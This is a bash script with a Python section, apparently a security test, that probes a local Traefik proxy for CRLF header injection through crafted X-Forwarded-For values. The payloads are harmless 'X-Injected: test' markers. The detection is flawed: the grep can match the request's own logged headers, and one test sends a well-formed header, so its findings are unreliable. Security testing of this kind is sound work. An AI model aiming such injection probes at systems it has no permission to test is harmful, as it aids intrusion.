#!/bin/bash
# CRLF 注入测试脚本
# 测试 Traefik 是否容易受到 CRLF 注入攻击

TRAEFIK_URL="${TRAEFIK_URL:-http://localhost:8080}"
TEST_DIR="crlf_tests"
mkdir -p "$TEST_DIR"

echo "=========================================="
echo "Traefik CRLF 注入测试"
echo "=========================================="
echo "目标: $TRAEFIK_URL"
echo ""

# 测试 1: 直接 CRLF 注入到 X-Forwarded-For
echo "测试 1: X-Forwarded-For CRLF 注入"
echo "-----------------------------------"
CRLF_PAYLOAD=$(printf "127.0.0.1\r\nX-Injected: test\r\n")
curl -v -H "X-Forwarded-For: $CRLF_PAYLOAD" \
    "$TRAEFIK_URL/" \
    > "$TEST_DIR/crlf_xff_direct.log" 2>&1

if grep -q "X-Injected" "$TEST_DIR/crlf_xff_direct.log"; then
    echo "⚠️  检测到可能的头部注入（响应包含 X-Injected）"
    grep "X-Injected" "$TEST_DIR/crlf_xff_direct.log"
else
    echo "✓ 未检测到明显的头部注入"
fi
echo ""

# 测试 2: URL 编码的 CRLF
echo "测试 2: URL 编码的 CRLF (%0d%0a)"
echo "-----------------------------------"
curl -v -H "X-Forwarded-For: 127.0.0.1%0d%0aX-Injected: test" \
    "$TRAEFIK_URL/" \
    > "$TEST_DIR/crlf_xff_urlencoded.log" 2>&1

if grep -q "X-Injected" "$TEST_DIR/crlf_xff_urlencoded.log"; then
    echo "⚠️  检测到 URL 编码的头部注入"
    grep "X-Injected" "$TEST_DIR/crlf_xff_urlencoded.log"
else
    echo "✓ 未检测到 URL 编码的头部注入"
fi
echo ""

# 测试 3: 多个 X-Forwarded-For 值（模拟 Traefik 的 strings.Join 行为）
echo "测试 3: 多个 X-Forwarded-For 值"
echo "-----------------------------------"
curl -v \
    -H "X-Forwarded-For: 192.168.1.1" \
    -H "X-Forwarded-For: 127.0.0.1$(printf '\r\n')X-Injected: test" \
    "$TRAEFIK_URL/" \
    > "$TEST_DIR/crlf_xff_multiple.log" 2>&1

if grep -q "X-Injected" "$TEST_DIR/crlf_xff_multiple.log"; then
    echo "⚠️  检测到多个头部值中的 CRLF 注入"
    grep "X-Injected" "$TEST_DIR/crlf_xff_multiple.log"
else
    echo "✓ 未检测到多个头部值中的 CRLF 注入"
fi
echo ""

# 测试 4: 检查响应头
echo "测试 4: 检查响应头"
echo "-----------------------------------"
curl -v -H "X-Forwarded-For: 127.0.0.1$(printf '\r\n')X-Injected: test" \
    "$TRAEFIK_URL/api/rawdata" \
    > "$TEST_DIR/crlf_response_headers.log" 2>&1

echo "响应头分析:"
grep -E "^< (X-|Set-Cookie|Location)" "$TEST_DIR/crlf_response_headers.log" | head -10
echo ""

# 测试 5: 使用 Python 发送原始 HTTP 请求
echo "测试 5: 原始 HTTP 请求（使用 Python）"
echo "-----------------------------------"
python3 << 'PYTHON_SCRIPT'
import socket
import sys

def send_crlf_test():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect(('localhost', 8080))
        
        # 构造包含 CRLF 的请求
        request = (
            "GET / HTTP/1.1\r\n"
            "Host: localhost:8080\r\n"
            "X-Forwarded-For: 127.0.0.1\r\n"
            "X-Injected: test\r\n"
            "\r\n"
        )
        
        sock.send(request.encode())
        response = sock.recv(4096).decode('utf-8', errors='ignore')
        sock.close()
        
        # 检查响应
        if 'X-Injected' in response:
            print("⚠️  检测到 CRLF 注入 - 响应包含 X-Injected")
            # 打印响应头部分
            lines = response.split('\n')[:20]
            for line in lines:
                if 'X-Injected' in line or 'X-Forwarded' in line:
                    print(f"  {line.strip()}")
        else:
            print("✓ 未检测到 CRLF 注入")
            
    except Exception as e:
        print(f"错误: {e}")

send_crlf_test()
PYTHON_SCRIPT

echo ""
echo "=========================================="
echo "测试完成"
echo "=========================================="
echo "详细日志保存在: $TEST_DIR/"
echo ""
echo "注意:"
echo "1. 这些测试检查响应中是否包含注入的头部"
echo "2. 如果检测到注入，需要进一步分析影响"
echo "3. 某些情况下，Go 标准库可能会处理 CRLF，但仍需验证"


